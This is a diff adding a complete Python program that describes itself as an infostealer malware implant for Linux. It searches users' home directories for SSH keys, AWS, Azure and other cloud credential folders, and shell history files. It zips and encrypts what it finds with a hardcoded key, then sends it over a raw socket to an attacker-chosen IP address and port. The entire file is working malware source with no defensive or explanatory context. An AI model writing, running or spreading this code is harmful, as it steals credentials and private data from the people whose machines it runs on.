@@ -1,0 +1,92 @@
+import socket
+import argparse
+import os
+import io
+import zipfile
+from cryptography.fernet import Fernet
+
+# Generate key
+ENCRYPTION_KEY = b"EcpHWPPgmrzGF1tlpVeLWFgT03-3xr7UeHopFUlyNuk="
+
+# Value of key assign to variable
+f = Fernet(ENCRYPTION_KEY)
+
+
+def find_files():
+    """Find all files of interest in home directory"""
+    sensitive_files = []
+    sensitive_dirs = ["/.ssh", "/.config", "/.aws", "/.gloud", "/.azure"]
+
+    for root, dirs, files in os.walk("/home/"):
+        if any(sensitive_dir in root for sensitive_dir in sensitive_dirs):
+            # Will eventually walk down into subdirectories
+            for file in files:
+                filepath = os.path.join(root, file)
+                sensitive_files.append(filepath)
+
+        # Could have a .*_history file anywhere
+        for file in files:
+            if file.startswith(".") and file.endswith("_history"):
+                filepath = os.path.join(root, file)
+                sensitive_files.append(filepath)
+
+    return sensitive_files
+
+
+def create_zip_archive(files: list[str]):
+    # Use bufferd I/O binary stream in memory
+    zip_buffer = io.BytesIO()
+
+    with zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED) as zipf:
+        for filepath in files:
+            try:
+                parts = filepath.split("/")
+                arcname = "/".join(parts[3:])  # Skip /home/username/ for relative path
+                with open(filepath, "rb") as f:
+                    zipf.writestr(arcname, f.read())
+            except (PermissionError, FileNotFoundError):
+                continue  # Skip if inadequate permissions or not found
+    # Change stream position to start
+    zip_buffer.seek(0)
+    # Return bytes up to EOF
+    return zip_buffer.read()
+
+
+def encrypt_data(data: bytes):
+    """Encrypt archive with Fernet symmetric encryption"""
+    return f.encrypt(data)
+
+
+def send_to_server(ip: str, port: int, data: bytes):
+    """Send encrypted data to the server."""
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
+        sock.connect((ip, port))
+        size = len(data)
+
+        # Simple protocol
+        sock.sendall(size.to_bytes(8, "big"))  # Big endian for network byte order
+        sock.sendall(data)
+
+
+def main():
+    parser = argparse.ArgumentParser(
+        description="Infostealer malware implant for Linux systems that sends exfiltrated data to destination server.",
+        usage="Usage: ./ <destination ip> <destination port>",
+    )
+    # Positional arguments <ip> <port>
+    parser.add_argument("dest_ip")
+    parser.add_argument("dest_port", type=int)
+    args = parser.parse_args()
+
+    server_ip, server_port = args.dest_ip, args.dest_port
+    files = find_files()
+
+    archive_data = create_zip_archive(files)
+
+    encrypted_data = encrypt_data(archive_data)
+
+    send_to_server(server_ip, server_port, encrypted_data)
+
+
+if __name__ == "__main__":
+    main()
